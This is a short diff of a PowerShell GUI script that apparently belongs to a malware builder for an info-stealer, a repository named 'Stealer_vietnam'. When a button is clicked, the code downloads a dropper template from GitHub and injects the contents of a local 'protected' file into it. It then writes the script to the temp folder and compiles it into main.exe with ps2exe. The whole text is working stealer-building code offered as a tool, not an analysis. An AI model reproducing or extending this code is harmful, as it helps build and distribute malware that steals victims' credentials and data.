@@ -100,7 +100,8 @@ $button.Add_Click({
         # Prepare and invoke the final PowerShell script
         $url = "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/drop/drop.ps1"
         $scriptContent = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
-        $scriptContent = $scriptContent -replace "batcodeinhere", $content
+        $scrcont = Get-Content $protectedFilePath -Raw
+        $scriptContent = $scriptContent -replace "batcodeinhere", $scrcont
         $pathexe = "$env:TEMP\main.exe"
         Set-Content -Path "$env:TEMP\main.ps1" -Value $scriptContent
         Invoke-ps2exe "$env:TEMP\main.ps1" "$pathexe"
